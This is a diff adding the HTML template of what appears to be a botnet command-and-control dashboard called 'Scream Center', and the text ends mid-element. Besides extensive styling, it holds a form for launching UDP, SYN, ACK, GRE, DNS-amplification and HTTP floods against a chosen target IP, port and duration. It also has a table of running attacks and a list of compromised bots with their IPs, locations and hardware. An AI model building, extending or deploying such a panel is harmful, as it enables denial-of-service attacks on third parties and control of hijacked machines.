@@ -1,0 +1,1744 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Dashboard</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        cyber: {
+                            dark: '#0a0a12',
+                            primary: '#00f0ff',
+                            secondary: '#7b2dff',
+                            accent: '#ff2d75',
+                            panel: '#131320',
+                            border: '#252538',
+                            text: '#e0e0ff',
+                            dim: '#a0a0c0'
+                        }
+                    },
+                    fontFamily: {
+                        'mono': ['"Fira Code"', 'monospace'],
+                        'sans': ['"Rajdhani"', 'sans-serif']
+                    },
+                    animation: {
+                        'pulse-slow': 'pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite',
+                        'glow': 'glow 2s ease-in-out infinite alternate',
+                        'scanline': 'scanline 8s linear infinite',
+                        'flicker': 'flicker 0.5s infinite alternate'
+                    },
+                    keyframes: {
+                        glow: {
+                            '0%': { 'text-shadow': '0 0 5px rgba(0, 240, 255, 0.5)' },
+                            '100%': { 'text-shadow': '0 0 20px rgba(0, 240, 255, 0.9)' }
+                        },
+                        scanline: {
+                            '0%': { transform: 'translateY(-100%)' },
+                            '100%': { transform: 'translateY(100vh)' }
+                        },
+                        flicker: {
+                            '0%': { opacity: '0.7' },
+                            '100%': { opacity: '1' }
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
+    <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.css" />
+    <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.Default.css" />
+    <style>
+        body {
+            background-color: #0a0a12;
+            background-image: 
+                radial-gradient(circle at 25% 25%, rgba(123, 45, 255, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 75% 75%, rgba(0, 240, 255, 0.1) 0%, transparent 50%);
+            color: #e0e0ff;
+            font-family: 'Rajdhani', sans-serif;
+        }
+
+        .cyber-btn {
+            background: linear-gradient(135deg, rgba(0, 240, 255, 0.2), rgba(123, 45, 255, 0.2));
+            border: 1px solid rgba(0, 240, 255, 0.3);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .cyber-btn:hover {
+            background: linear-gradient(135deg, rgba(0, 240, 255, 0.3), rgba(123, 45, 255, 0.3));
+            box-shadow: 0 0 15px rgba(0, 240, 255, 0.4);
+            transform: translateY(-2px);
+        }
+
+        .cyber-btn:active {
+            transform: translateY(0);
+        }
+
+        .cyber-btn:before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 240, 255, 0.4), transparent);
+            transition: all 0.5s ease;
+        }
+
+        .cyber-btn:hover:before {
+            left: 100%;
+        }
+
+        .cyber-panel {
+            background-color: #131320;
+            border: 1px solid #252538;
+            border-radius: 4px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .cyber-panel:before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, #00f0ff, #7b2dff);
+        }
+
+        .cyber-title {
+            color: #00f0ff;
+            text-shadow: 0 0 8px rgba(0, 240, 255, 0.5);
+            letter-spacing: 1px;
+            font-weight: 600;
+        }
+
+        .cyber-subtitle {
+            color: #a0a0c0;
+            font-size: 0.9rem;
+            letter-spacing: 0.5px;
+        }
+
+        .cyber-input {
+            background-color: #131320;
+            border: 1px solid #252538;
+            color: #e0e0ff;
+            font-family: 'Fira Code', monospace;
+            transition: all 0.3s ease;
+        }
+
+        .cyber-input:focus {
+            border-color: #00f0ff;
+            box-shadow: 0 0 0 2px rgba(0, 240, 255, 0.3);
+            outline: none;
+        }
+
+        .cyber-select {
+            background-color: #131320;
+            border: 1px solid #252538;
+            color: #e0e0ff;
+            font-family: 'Fira Code', monospace;
+            transition: all 0.3s ease;
+        }
+
+        .cyber-select:focus {
+            border-color: #00f0ff;
+            box-shadow: 0 0 0 2px rgba(0, 240, 255, 0.3);
+            outline: none;
+        }
+
+        .cyber-table {
+            border-collapse: separate;
+            border-spacing: 0;
+        }
+
+        .cyber-table th {
+            background-color: #131320;
+            border-bottom: 1px solid #252538;
+            color: #00f0ff;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-size: 0.75rem;
+        }
+
+        .cyber-table td {
+            border-bottom: 1px solid #252538;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.9rem;
+        }
+
+        .cyber-table tr:hover td {
+            background-color: rgba(0, 240, 255, 0.05);
+        }
+
+        .bot-marker {
+            width: 30px;
+            height: 42px;
+            position: relative;
+        }
+
+        .marker-pin {
+            width: 24px;
+            height: 24px;
+            border-radius: 50% 50% 50% 0;
+            background: #00f0ff;
+            position: absolute;
+            transform: rotate(-45deg);
+            left: 50%;
+            top: 50%;
+            margin: -12px 0 0 -12px;
+            box-shadow: 0 0 10px rgba(0, 240, 255, 0.7);
+        }
+
+        .marker-pin:after {
+            content: '';
+            width: 16px;
+            height: 16px;
+            margin: 4px 0 0 4px;
+            background: #131320;
+            position: absolute;
+            border-radius: 50%;
+        }
+
+        .cluster-marker {
+            background: rgba(123, 45, 255, 0.6);
+            border-radius: 50%;
+            text-align: center;
+            color: white;
+            font-weight: bold;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 0 4px rgba(123, 45, 255, 0.3);
+        }
+        
+        .cluster-marker-small {
+            width: 30px;
+            height: 30px;
+        }
+
+        .cluster-marker-medium {
+            width: 40px;
+            height: 40px;
+        }
+
+        .cluster-marker-large {
+            width: 50px;
+            height: 50px;
+        }
+
+        .custom-scrollbar::-webkit-scrollbar {
+            width: 6px;
+            height: 6px;
+        }
+
+        .custom-scrollbar::-webkit-scrollbar-track {
+            background: #131320;
+            border-radius: 3px;
+        }
+
+        .custom-scrollbar::-webkit-scrollbar-thumb {
+            background: #00f0ff;
+            border-radius: 3px;
+        }
+
+        .custom-scrollbar::-webkit-scrollbar-thumb:hover {
+            background: #7b2dff;
+        }
+
+        .attack-method-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            padding: 4px 10px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: 500;
+            font-family: 'Fira Code', monospace;
+            background-color: rgba(0, 240, 255, 0.1);
+            border: 1px solid rgba(0, 240, 255, 0.3);
+            color: #00f0ff;
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+        }
+
+        .overlay.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+
+        .modal {
+            background-color: #131320;
+            border: 1px solid #252538;
+            border-radius: 4px;
+            width: 90%;
+            max-width: 800px;
+            max-height: 90vh;
+            overflow-y: auto;
+            transform: translateY(20px);
+            transition: transform 0.3s ease;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+
+        .overlay.active .modal {
+            transform: translateY(0);
+        }
+
+        .tab-button {
+            position: relative;
+            padding: 12px 20px;
+            cursor: pointer;
+            color: #a0a0c0;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+
+        .tab-button.active {
+            color: #00f0ff;
+        }
+
+        .tab-button.active:after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, #00f0ff, #7b2dff);
+        }
+
+        .command-card {
+            transition: all 0.3s ease;
+            border-left: 3px solid transparent;
+            background-color: #131320;
+            border: 1px solid #252538;
+        }
+
+        .command-card:hover {
+            transform: translateY(-5px);
+            border-left-color: #00f0ff;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .status-indicator {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            display: inline-block;
+        }
+
+        .status-active {
+            background-color: #00ff88;
+            box-shadow: 0 0 0 2px rgba(0, 255, 136, 0.3);
+        }
+
+        .status-inactive {
+            background-color: #ff2d75;
+            box-shadow: 0 0 0 2px rgba(255, 45, 117, 0.3);
+        }
+
+        .terminal-effect {
+            position: relative;
+        }
+
+        .terminal-effect:after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(
+                to bottom,
+                transparent,
+                transparent 50%,
+                rgba(0, 240, 255, 0.05) 50%,
+                rgba(0, 240, 255, 0.05)
+            );
+            background-size: 100% 4px;
+            pointer-events: none;
+            animation: scanline 8s linear infinite;
+        }
+
+        .cyber-badge {
+            display: inline-block;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            font-family: 'Fira Code', monospace;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .cyber-badge-owner {
+            background-color: rgba(123, 45, 255, 0.2);
+            border: 1px solid rgba(123, 45, 255, 0.5);
+            color: #7b2dff;
+        }
+
+        .cyber-badge-admin {
+            background-color: rgba(0, 240, 255, 0.2);
+            border: 1px solid rgba(0, 240, 255, 0.5);
+            color: #00f0ff;
+        }
+
+        .cyber-badge-user {
+            background-color: rgba(160, 160, 192, 0.2);
+            border: 1px solid rgba(160, 160, 192, 0.5);
+            color: #a0a0c0;
+        }
+
+        .cyber-badge-destructive {
+            background-color: rgba(255, 45, 117, 0.2);
+            border: 1px solid rgba(255, 45, 117, 0.5);
+            color: #ff2d75;
+        }
+
+        .cyber-badge-stealth {
+            background-color: rgba(0, 255, 136, 0.2);
+            border: 1px solid rgba(0, 255, 136, 0.5);
+            color: #00ff88;
+        }
+
+        .cyber-badge-maintenance {
+            background-color: rgba(255, 184, 0, 0.2);
+            border: 1px solid rgba(255, 184, 0, 0.5);
+            color: #ffb800;
+        }
+
+        .cyber-metric {
+            font-family: 'Fira Code', monospace;
+            font-size: 2.5rem;
+            font-weight: 500;
+            background: linear-gradient(to right, #00f0ff, #7b2dff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .cyber-metric-label {
+            color: #a0a0c0;
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .cyber-divider {
+            height: 1px;
+            background: linear-gradient(90deg, transparent, #252538, transparent);
+        }
+
+        .cyber-flash {
+            background-color: rgba(0, 240, 255, 0.1);
+            border: 1px solid rgba(0, 240, 255, 0.3);
+            color: #00f0ff;
+            font-family: 'Fira Code', monospace;
+            animation: flicker 0.5s infinite alternate;
+        }
+
+        .cyber-flash-btn {
+            color: #00f0ff;
+            transition: all 0.3s ease;
+        }
+
+        .cyber-flash-btn:hover {
+            transform: scale(1.2);
+        }
+
+        .cyber-dropdown {
+            background-color: #131320;
+            border: 1px solid #252538;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+
+        .cyber-dropdown-item {
+            transition: all 0.3s ease;
+        }
+
+        .cyber-dropdown-item:hover {
+            background-color: rgba(0, 240, 255, 0.1);
+            color: #00f0ff;
+        }
+
+        .cyber-progress {
+            height: 4px;
+            background-color: #131320;
+            border-radius: 2px;
+            overflow: hidden;
+        }
+
+        .cyber-progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #00f0ff, #7b2dff);
+            transition: width 0.5s ease;
+        }
+
+        #add-user-form::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+        
+        #add-user-form::-webkit-scrollbar-track {
+            background: rgba(19, 19, 32, 0.8);
+            border-radius: 4px;
+            margin: 4px 0;
+        }
+        
+        #add-user-form::-webkit-scrollbar-thumb {
+            background: linear-gradient(#00f0ff, #7b2dff);
+            border-radius: 4px;
+            border: 1px solid rgba(0, 240, 255, 0.3);
+        }
+        
+        #add-user-form::-webkit-scrollbar-thumb:hover {
+            background: linear-gradient(#7b2dff, #00f0ff);
+        }
+        
+        #add-user-form {
+            scrollbar-width: thin;
+            scrollbar-color: #00f0ff #131320;
+        }
+
+        .date-picker {
+            background-color: #131320;
+            border: 1px solid #252538;
+            color: #e0e0ff;
+            font-family: 'Fira Code', monospace;
+            transition: all 0.3s ease;
+        }
+        
+        .date-picker:focus {
+            border-color: #00f0ff;
+            box-shadow: 0 0 0 2px rgba(0, 240, 255, 0.3);
+            outline: none;
+        }
+        
+        .date-picker::-webkit-calendar-picker-indicator {
+            filter: invert(0.7) sepia(1) hue-rotate(170deg) saturate(5);
+            cursor: pointer;
+            opacity: 0;
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            left: 0;
+        }
+        
+        .date-picker::-webkit-datetime-edit {
+            color: #e0e0ff;
+            padding: 0;
+        }
+        
+        .date-picker::-webkit-datetime-edit-fields-wrapper {
+            background: #131320;
+        }
+        
+        .date-picker::-webkit-datetime-edit-text {
+            color: #00f0ff;
+            padding: 0 0.2em;
+        }
+        
+        .date-picker::-webkit-inner-spin-button {
+            display: none;
+        }
+
+        #world-map {
+            height: 100%;
+            width: 100%;
+            min-height: 400px;
+            background-color: #0a0a12;
+            position: relative;
+            z-index: 1;
+        }
+
+        .tooltip {
+            position: relative;
+            display: inline-block;
+        }
+
+        .tooltip .tooltip-text {
+            visibility: hidden;
+            width: 200px;
+            background-color: #131320;
+            color: #e0e0ff;
+            border: 1px solid #252538;
+            text-align: center;
+            border-radius: 4px;
+            padding: 8px;
+            position: absolute;
+            z-index: 100;
+            bottom: 125%;
+            left: 50%;
+            transform: translateX(-50%);
+            opacity: 0;
+            transition: opacity 0.3s;
+            font-size: 0.8rem;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .tooltip .tooltip-text::after {
+            content: "";
+            position: absolute;
+            top: 100%;
+            left: 50%;
+            margin-left: -5px;
+            border-width: 5px;
+            border-style: solid;
+            border-color: #252538 transparent transparent transparent;
+        }
+
+        .tooltip:hover .tooltip-text {
+            visibility: visible;
+            opacity: 1;
+        }
+
+        @keyframes terminal-typing {
+            from { width: 0 }
+            to { width: 100% }
+        }
+
+        @keyframes terminal-caret {
+            50% { border-color: transparent }
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col terminal-effect">
+    <header class="bg-cyber-dark border-b border-cyber-border px-6 py-4 flex flex-col sm:flex-row justify-between items-center gap-4 sticky top-0 z-50">
+        <div class="flex items-center gap-3">
+            <div class="w-8 h-8 flex items-center justify-center bg-cyber-primary rounded-full">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-5 h-5 text-cyber-dark">
+                    <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"></path>
+                </svg>
+            </div>
+            <h1 class="text-xl font-bold cyber-title">
+                <span class="text-cyber-primary">Scream</span> <span class="text-cyber-dim">Center</span>
+            </h1>
+        </div>
+        <div class="flex items-center gap-4">
+            <div class="relative group">
+                <button id="profile-button" class="flex items-center gap-2 px-4 py-2 rounded-md cyber-btn">
+                    <span class="text-sm font-medium text-cyber-primary">{{.User.Username}}</span>
+                    <span class="cyber-badge {{if eq .User.Level "Owner"}}cyber-badge-owner{{else if eq .User.Level "Admin"}}cyber-badge-admin{{else}}cyber-badge-user{{end}}">
+                        {{.User.Level}}
+                    </span>
+                    <i class="fas fa-chevron-down text-xs text-cyber-dim"></i>
+                </button>
+                <div id="profile-dropdown" class="hidden absolute right-0 mt-2 w-56 cyber-dropdown rounded-md z-50">
+                    <div class="p-4 border-b border-cyber-border">
+                        <p class="text-sm font-medium text-cyber-primary">{{.User.Username}}</p>
+                        <p class="text-xs cyber-subtitle">{{.User.Level}} Access</p>
+                    </div>
+                    <div class="p-1">
+                        <a href="/logout" class="block px-4 py-2 text-sm cyber-dropdown-item rounded-md">
+                            <i class="fas fa-sign-out-alt mr-2 text-cyber-dim"></i> Terminate Session
+                        </a>
+                        {{if eq .User.Level "Owner"}}
+                        <button onclick="showAdminPanel()" class="block w-full text-left px-4 py-2 text-sm cyber-dropdown-item rounded-md">
+                            <i class="fas fa-user-shield mr-2 text-cyber-primary"></i> Admin Console
+                        </button>
+                        {{end}}
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    {{if .FlashMessage}}
+    <div class="mx-6 mt-4 px-4 py-3 cyber-flash rounded-md flex justify-between items-center">
+        <span class="font-mono">{{.FlashMessage}}</span>
+        <button onclick="this.parentElement.remove()" class="cyber-flash-btn">
+            <i class="fas fa-times"></i>
+        </button>
+    </div>
+    {{end}}
+
+    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 px-6 py-4">
+        <div class="cyber-panel p-4 transition-all duration-200 hover:border-cyber-primary">
+            <div class="flex items-center justify-between">
+                <p class="cyber-metric-label">Connected Bots</p>
+                <div class="w-8 h-8 flex items-center justify-center rounded-full bg-cyber-primary/10 border border-cyber-primary/30">
+                    <i class="fas fa-robot text-cyber-primary"></i>
+                </div>
+            </div>
+            <p class="mt-2 cyber-metric bot-count-metric">
+                {{.BotCount}}
+            </p>            
+        </div>
+        
+        <div class="cyber-panel p-4 transition-all duration-200 hover:border-cyber-primary">
+            <div class="flex items-center justify-between">
+                <p class="cyber-metric-label">Active Attacks</p>
+                <div class="w-8 h-8 flex items-center justify-center rounded-full bg-cyber-accent/10 border border-cyber-accent/30">
+                    <i class="fas fa-bolt text-cyber-accent"></i>
+                </div>
+            </div>
+            <p class="mt-2 cyber-metric attack-count-metric">
+                {{len .OngoingAttacks}}/3
+            </p>
+        </div>
+        
+        <div class="cyber-panel p-4 transition-all duration-200 hover:border-cyber-primary">
+            <div class="flex items-center justify-between">
+                <p class="cyber-metric-label">Countries</p>
+                <div class="w-8 h-8 flex items-center justify-center rounded-full bg-cyber-secondary/10 border border-cyber-secondary/30">
+                    <i class="fas fa-globe text-cyber-secondary"></i>
+                </div>
+            </div>
+        </div>
+        
+        <div class="cyber-panel p-4 transition-all duration-200 hover:border-cyber-primary">
+            <div class="flex items-center justify-between">
+                <p class="cyber-metric-label">Users</p>
+                <div class="w-8 h-8 flex items-center justify-center rounded-full bg-cyber-primary/10 border border-cyber-primary/30">
+                    <i class="fas fa-users text-cyber-primary"></i>
+                </div>
+            </div>
+            <p class="mt-2 cyber-metric">
+                {{len .Users}}
+            </p>
+        </div>
+    </div>
+
+    <main class="flex-1 grid grid-cols-1 lg:grid-cols-2 gap-6 p-6">
+        <div class="cyber-panel animate-fade-in" style="animation-delay: 0.1s">
+            <div id="bot-details" class="hidden px-6 py-4 border-t border-cyber-border">
+                <div class="flex justify-between items-center mb-3">
+                    <div class="flex items-center gap-2">
+                        <span class="w-2 h-2 rounded-full bg-cyber-primary"></span>
+                        <h3 class="text-lg font-medium cyber-title">Bot Details</h3>
+                    </div>
+                    <button onclick="hideBotDetails()" class="text-cyber-dim hover:text-cyber-primary transition-colors duration-200">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
+                        </svg>
+                    </button>
+                </div>
+                <div class="grid grid-cols-2 md:grid-cols-3 gap-3">
+                    <div class="bg-cyber-panel p-3 rounded-md">
+                        <p class="text-xs cyber-metric-label">IP Address</p>
+                        <p id="detail-ip" class="font-mono text-cyber-primary">-</p>
+                    </div>
+                    <div class="bg-cyber-panel p-3 rounded-md">
+                        <p class="text-xs cyber-metric-label">Location</p>
+                        <p id="detail-location" class="text-cyber-primary">-</p>
+                    </div>
+                    <div class="bg-cyber-panel p-3 rounded-md">
+                        <p class="text-xs cyber-metric-label">Architecture</p>
+                        <p id="detail-arch" class="text-cyber-primary">-</p>
+                    </div>
+                    <div class="bg-cyber-panel p-3 rounded-md">
+                        <p class="text-xs cyber-metric-label">Connected</p>
+                        <p id="detail-time" class="text-cyber-primary">-</p>
+                    </div>
+                    <div class="bg-cyber-panel p-3 rounded-md">
+                        <p class="text-xs cyber-metric-label">Cores</p>
+                        <p id="detail-cores" class="text-cyber-primary">-</p>
+                    </div>
+                    <div class="bg-cyber-panel p-3 rounded-md">
+                        <p class="text-xs cyber-metric-label">RAM</p>
+                        <p id="detail-ram" class="text-cyber-primary">-</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="cyber-panel animate-fade-in" style="animation-delay: 0.2s">
+            <div class="px-6 py-4 border-b border-cyber-border">
+                <h2 class="text-lg font-semibold cyber-title flex items-center gap-2">
+                    <span class="w-2 h-2 rounded-full bg-cyber-primary"></span>
+                    Attack Vector
+                </h2>
+            </div>
+            <form action="/attack" method="POST" autocomplete="off" class="p-6 space-y-6"> 
+                <div class="space-y-1">
+                    <label for="method" class="block text-sm cyber-metric-label mb-1 flex items-center gap-2">
+                        <i class="fas fa-code-branch mr-2 text-cyber-secondary"></i>
+                        Attack Protocol
+                        <div class="tooltip">
+                            <i class="fas fa-info-circle text-cyber-dim"></i>
+                            <span class="tooltip-text">Select the type of attack to launch against the target</span>
+                        </div>
+                    </label>
+                    <select id="method" name="method" required 
+                            class="w-full cyber-select h-12 px-4 text-cyber-primary"> 
+                        <option value="" disabled selected>Select attack method...</option>
+                        <option value="!udpflood">UDP Flood</option>
+                        <option value="!udpsmart">UDP Smart</option>
+                        <option value="!tcpflood">TCP Flood</option>
+                        <option value="!synflood">SYN Flood</option>
+                        <option value="!ackflood">ACK Flood</option>
+                        <option value="!greflood">GRE Flood</option>
+                        <option value="!dns">DNS Amplification</option>
+                        <option value="!http">HTTP Flood</option>
+                    </select>
+                </div>
+        
+                <div class="space-y-1">
+                    <label for="ip" class="block text-sm cyber-metric-label mb-1">
+                        <i class="fas fa-bullseye mr-2 text-cyber-secondary"></i>
+                        Target IP
+                    </label>
+                    <input type="text" id="ip" name="ip" required 
+                           placeholder="192.168.1.1" 
+                           autocapitalize="off" autocorrect="off" 
+                           class="w-full cyber-input h-12 px-4 text-cyber-primary"> 
+                </div>
+        
+                <div class="space-y-1">
+                    <label for="port" class="block text-sm cyber-metric-label mb-1">
+                        <i class="fas fa-plug mr-2 text-cyber-secondary"></i>
+                        Target Port
+                    </label>
+                    <input type="text" id="port" name="port" required 
+                           placeholder="80" 
+                           class="w-full cyber-input h-12 px-4 text-cyber-primary"> 
+                </div>
+        
+                <div class="space-y-1">
+                    <label for="duration" class="block text-sm cyber-metric-label mb-1">
+                        <i class="fas fa-clock mr-2 text-cyber-secondary"></i>
+                        Duration (seconds)
+                    </label>
+                    <input type="number" id="duration" name="duration" min="1" max="300" required 
+                           placeholder="60" 
+                           class="w-full cyber-input h-12 px-4 text-cyber-primary"> 
+                    <div class="flex justify-between text-xs text-cyber-dim mt-1">
+                        <span>Minimum: 1s</span>
+                        <span>Maximum: 300s</span>
+                    </div>
+                </div>
+        
+                <button type="submit" 
+                        class="w-full cyber-btn py-3 px-6 rounded-md flex items-center justify-center gap-3 mt-4"> 
+                    <i class="fas fa-rocket text-lg"></i>
+                    <span class="text-lg font-medium">Initiate Attack Sequence</span>
+                </button>
+            </form>
+        </div>
+
+        <div class="cyber-panel animate-fade-in" style="animation-delay: 0.3s">
+            <div class="px-6 py-4 border-b border-cyber-border flex justify-between items-center">
+                <h2 class="text-lg font-semibold cyber-title flex items-center gap-2">
+                    <span class="w-2 h-2 rounded-full bg-cyber-primary"></span>
+                    Active Engagements
+                </h2>
+                {{if .OngoingAttacks}}
+                <button onclick="stopAllAttacks()" class="cyber-btn py-1 px-3 rounded-md flex items-center gap-2 text-sm">
+                    <i class="fas fa-stop-circle"></i>
+                    <span>Stop All</span>
+                </button>
+                {{end}}
+            </div>
+            <div class="custom-scrollbar overflow-x-auto">
+                <table class="w-full cyber-table">
+                    <thead>
+                        <tr>
+                            <th class="px-6 py-3 text-left">Protocol</th>
+                            <th class="px-6 py-3 text-left">Target</th>
+                            <th class="px-6 py-3 text-left">Duration</th>
+                            <th class="px-6 py-3 text-left">Remaining</th>
+                            <th class="px-6 py-3 text-left">Action</th>
+                        </tr>
+                    </thead>
+                    <tbody id="attacks-table" class="divide-y divide-cyber-border">
+                        {{if .OngoingAttacks}}
+                            {{range .OngoingAttacks}}
+                            <tr class="hover:bg-cyber-panel transition-colors">
+                                <td class="px-6 py-4 whitespace-nowrap">
+                                    <span class="attack-method-badge">
+                                        {{if eq .Method "!udpflood"}}<i class="fas fa-bolt"></i> UDP Flood{{end}}
+                                        {{if eq .Method "!udpsmart"}}<i class="fas fa-brain"></i> UDP Smart{{end}}
+                                        {{if eq .Method "!tcpflood"}}<i class="fas fa-network-wired"></i> TCP Flood{{end}}
+                                        {{if eq .Method "!synflood"}}<i class="fas fa-sync"></i> SYN Flood{{end}}
+                                        {{if eq .Method "!ackflood"}}<i class="fas fa-reply"></i> ACK Flood{{end}}
+                                        {{if eq .Method "!greflood"}}<i class="fas fa-project-diagram"></i> GRE Flood{{end}}
+                                        {{if eq .Method "!dns"}}<i class="fas fa-server"></i> DNS{{end}}
+                                        {{if eq .Method "!http"}}<i class="fas fa-globe"></i> HTTP{{end}}
+                                    </span>
+                                </td>
+                                <td class="px-6 py-4 whitespace-nowrap font-mono text-cyber-primary">{{.Target}}:{{.Port}}</td>
+                                <td class="px-6 py-4 whitespace-nowrap text-cyber-primary">{{.Duration}}</td>
+                                <td class="px-6 py-4 whitespace-nowrap text-cyber-primary">{{.Remaining}}</td>
+                                <td class="px-6 py-4 whitespace-nowrap">
+                                    <a href="/stop-attack?id={{.ID}}" class="inline-flex items-center px-3 py-1 rounded-md bg-cyber-accent/10 border border-cyber-accent/30 text-cyber-accent text-sm font-medium transition-all duration-200 hover:bg-cyber-accent/20">
+                                        <i class="fas fa-stop mr-1"></i> Terminate
+                                    </a>
+                                </td>
+                            </tr>
+                            {{end}}
+                        {{else}}
+                            <tr>
+                                <td colspan="5" class="px-6 py-4 text-center text-cyber-dim font-mono">No active engagements</td>
+                            </tr>
+                        {{end}}
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <div class="cyber-panel animate-fade-in" style="animation-delay: 0.4s">
+            <div class="px-6 py-4 border-b border-cyber-border">
+                <h2 class="text-lg font-semibold cyber-title flex items-center gap-2">
+                    <span class="w-2 h-2 rounded-full bg-cyber-primary"></span>
+                    Bot Network
+                </h2>
+            </div>
+            <div class="custom-scrollbar overflow-x-auto">
+                <table class="w-full cyber-table">
+                    <thead>
+                        <tr>
+                            <th class="px-6 py-3 text-left">Status</th>
+                            <th class="px-6 py-3 text-left">IP Address</th>
+                            <th class="px-6 py-3 text-left">Location</th>
+                            <th class="px-6 py-3 text-left">Architecture</th>
+                            <th class="px-6 py-3 text-left">Connected Since</th>
+                        </tr>
+                    </thead>
+                    <tbody class="divide-y divide-cyber-border">
+                        {{if .Bots}}
+                            {{range .Bots}}
+                            <tr class="hover:bg-cyber-panel transition-colors cursor-pointer bot-row" data-bot='{
+                                "IP": "{{.IP}}",
+                                "Country": "{{.Country}}",
+                                "City": "{{.City}}",
+                                "Region": "{{.Region}}",
+                                "Arch": "{{.Arch}}",
+                                "Time": "{{.Time.Format "2006-01-02T15:04:05Z07:00"}}",
+                                "Cores": {{if .Cores}}{{.Cores}}{{else}}0{{end}},
+                                "RAM": {{if .RAM}}{{.RAM}}{{else}}0{{end}},
+                                "Latitude": {{if .Latitude}}{{.Latitude}}{{else}}0{{end}},
+                                "Longitude": {{if .Longitude}}{{.Longitude}}{{else}}0{{end}},
+                                "LastHeartbeat": "{{.LastHeartbeat.Format "2006-01-02T15:04:05Z07:00"}}"
+                            }'>
+                                <td class="px-6 py-4 whitespace-nowrap">
+                                    {{if isActive .LastHeartbeat}}
+                                    <span class="status-indicator status-active"></span>
+                                    {{else}}
+                                    <span class="status-indicator status-inactive"></span>
+                                    {{end}}
+                                </td>
+                                <td class="px-6 py-4 whitespace-nowrap font-mono text-cyber-primary">{{.IP}}</td>
+                                <td class="px-6 py-4 whitespace-nowrap text-cyber-primary">
+                                    {{if or .City .Region .Country}}
+                                        {{if .City}}{{.City}}{{end}}{{if and .City .Region}}, {{end}}
+                                        {{if .Region}}{{.Region}}{{end}}{{if and (or .City .Region) .Country}}, {{end}}
+                                        {{if .Country}}{{.Country}}{{end}}
+                                    {{else}}
+                                        Location unknown
+                                    {{end}}
+                                </td>
+                                <td class="px-6 py-4 whitespace-nowrap text-cyber-primary">{{.Arch}}</td>
+                                <td class="px-6 py-4 whitespace-nowrap text-cyber-primary">{{.Time.Format "2006-01-02 15:04:05"}}</td>
+                            </tr>
+                            {{end}}
+                        {{else}}
+                            <tr>
+                                <td colspan="5" class="px-6 py-4 text-center text-cyber-dim font-mono">No bots connected</td>
+                            </tr>
+                        {{end}}
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </main>
+
+    <div id="admin-overlay" class="overlay">
+        <div class="modal">
+            <div class="px-6 py-4 border-b border-cyber-border flex justify-between items-center">
+                <h2 class="text-lg font-semibold cyber-title flex items-center gap-2">
